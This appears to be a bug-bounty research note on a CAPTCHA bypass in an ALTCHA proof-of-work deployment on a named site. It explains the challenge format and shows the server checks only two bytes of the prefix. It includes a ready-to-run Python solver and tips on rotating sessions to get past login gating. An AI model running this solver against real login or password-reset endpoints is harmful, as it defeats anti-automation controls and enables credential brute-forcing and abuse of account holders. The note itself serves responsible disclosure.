# ALTCHA PoW Analysis — algorithm, payload format, worked case (do.de 2026-10-26)

Reference for `hunt-captcha-bypass` Pattern 7. Everything below was executed live against
https://my.do.de (Greenmark IT GmbH / do.de bug bounty) and reproduced 6x.

## 1. ALTCHA v3 challenge (as served by do.de)

```
GET https://my.do.de/api/altcha/get
{
  "parameters": {
    "algorithm": "PBKDF2/SHA-256",
    "cost": 5000,
    "expiresAt": 1792958713,          // unix, ~60 s TTL
    "keyLength": 32,
    "keyPrefix": "d31c4ae5fa7df74522e80f41c0b1cddb",   // 16 bytes = 128-bit target
    "keySignature": "7de5f76f...",    // deterministic-mode signature over keyPrefix
    "nonce": "ca87cccabb5c47909078e6c9ceb3e118",       // 16 bytes
    "salt": "7e15f3ffdfac59d79daa15975f6dbfd5"         // 16 bytes
  },
  "signature": "f521cff0..."          // HMAC over parameters (server secret)
}
```

## 2. Client solver (from the shipped altcha.js, `solveChallenge`)

```
password  = nonce_bytes(16) + counter_u32_be(4)          # 20 bytes
derivedKey = PBKDF2-SHA-256(password, salt_bytes, cost=5000, keyLength=32)
accept when derivedKey starts with keyPrefix             # full 16 bytes client-side
```

With a 16-byte prefix the client-side requirement is 2^128 PBKDF2 iterations — the shipped
widget can NEVER finish. That alone is a functionality bug (broken password reset); the
security bug is what the server actually accepts (section 4).

## 3. Submission payload (field name `altcha`, base64 of JSON)

```json
{
  "challenge": {"parameters": <parameters verbatim>, "signature": <signature verbatim>},
  "solution":  {"counter": <int>, "derivedKey": "<64 hex>", "time": 0}
}
```

POST as form field: `_token_=<CSRF>&usr=<email>&altcha=<base64(payload)>`.
The widget's default field name is `altcha` (confirmed in altcha.js default config).
v1-format payloads (`{algorithm, challenge, number, salt, signature, took}`) were also
rejected/accepted identically — the v3 structure above is what the docs specify.

## 4. Bisect result — the actual server threshold (do.de)

| derivedKey matches | Server behaviour |
|---|---|
| 1 byte (2 hex)  | REJECTED — generic "Bitte geben Sie alle Pflichtangaben an" |
| 2 bytes (4 hex) | **ACCEPTED** — "Das Passwort wurde erfolgreich verschickt, sofern der Account existiert" |
| 3 bytes (6 hex) | ACCEPTED |
| 4 bytes (8 hex) | ACCEPTED (then per-IP limit: "Zu viele Loginversuche, bitte warten Sie einige Minuten") |

So the server checks only the first 2 bytes: effective difficulty 2^16 (~65k iterations).
Pure-Python solve took 30-60 s; optimized C/GPU is seconds. Reproduced 6x on
`/login/password` with fresh challenges, plus 1x on `/login` after the 2-fail trigger
(3rd attempt with a 2-byte solution was processed: "Benutzername oder Passwort ungültig"
instead of the block error).

## 5. Solver (copy-paste, same-session)

```python
import requests, re, json, base64, hashlib
s = requests.Session()
r = s.get('https://<host>/login/password', timeout=60)
token = re.search(r'name="_token_"\s+value="([^"]+)"', r.text).group(1)
ch = s.get('https://<host>/api/altcha/get', timeout=60).json()
p, sig = ch['parameters'], ch['signature']
nonce, salt = bytes.fromhex(p['nonce']), bytes.fromhex(p['salt'])
for c in range(300000):
    dk = hashlib.pbkdf2_hmac('sha256', nonce + c.to_bytes(4, 'big'), salt, p['cost'], p['keyLength'])
    if dk.hex().startswith(p['keyPrefix'][:4]):     # 2-byte target = server's real check
        break
payload = {"challenge": {"parameters": p, "signature": sig},
           "solution": {"counter": c, "derivedKey": dk.hex(), "time": 0}}
r2 = s.post('https://<host>/login/password',
            data={'_token_': token, 'usr': '<email>',
                  'altcha': base64.b64encode(json.dumps(payload).encode()).decode()}, timeout=60)
```

## 6. Pitfalls confirmed live this session

- **Expired challenge reads as a false negative.** One validation run was rejected only
  because the 60 s TTL lapsed between fetch and submit (slow target, ~20 s/request).
  Fetch the challenge LAST, immediately before the POST, and keep the whole cycle < 60 s.
- **CSRF token must come from the submitting session.** A helper that opens a fresh
  session produces `CSRF_VALIDATION_FAILED` and masks the result (hit this once).
- **Generic error masking.** Missing field, malformed payload, wrong-length solution and
  expired challenge ALL return the same "required fields" toast. The only signal is the
  NEXT stage of the flow ("password sent" vs "enter all fields"). Bisect by match length.
- **Signature IS verified on do.de** — forged `cost=1` parameters and a garbage signature
  were both rejected. Test it anyway on every new target; it is a separate claim.
- **Per-IP rate limit exists** (~5 reset requests, then "too many attempts, wait some
  minutes") — name it as the mitigating control in the report; severity stays Medium
  ("insufficient anti-automation"), not "auth bypass".
- **Reactive trigger:** the login form only requires ALTCHA after 2 failed attempts per
  session; fresh sessions start with 2 free attempts. The bypass defeats the trigger, but
  the per-IP limit still bounds abuse.

## 6b. Login-flow trigger + signature verification (confirmed 2026-10-26)

- **Login gating is per-session and reactive:** on do.de the `/login` form serves NO altcha
  widget until 2 failed attempts *in the same session*; the 3rd attempt is blocked with
  "required fields" until a valid solution is submitted. A fresh session resets the counter
  (2 free attempts), so the control is session-scoped, not per-IP — note this when rating
  severity (attacker rotates sessions; the per-IP reset limit is the real backstop).
- **Bypass works on both flows:** a 2-byte solution submitted with the 3rd login attempt makes
  the server process credentials normally ("Benutzername oder Passwort ungültig" instead of
  the block), and on `/login/password` it yields the success toast. Same widget, same weakness.
- **Signature verification HELD on this target:** forged parameters (`cost=1`) with the real
  signature → REJECTED; garbage signature → REJECTED. Only the prefix-length check is
  truncated. Always test the signature separately — a target can hold one and fail the other.

## 7. Report shape that worked

Single finding, Medium (CVSS 5.3), CWE-347. Sections: summary → details → single-request
PoC → validation matrix (the table from section 4) → impact (control defeated + widget
also broken) → remediation (verify full prefix server-side, or use the signed
keySignature in deterministic mode) → references. No reward/credit phrasing; submitted
to the program address as a Gmail draft with the PDF PoC attached, NOT sent.
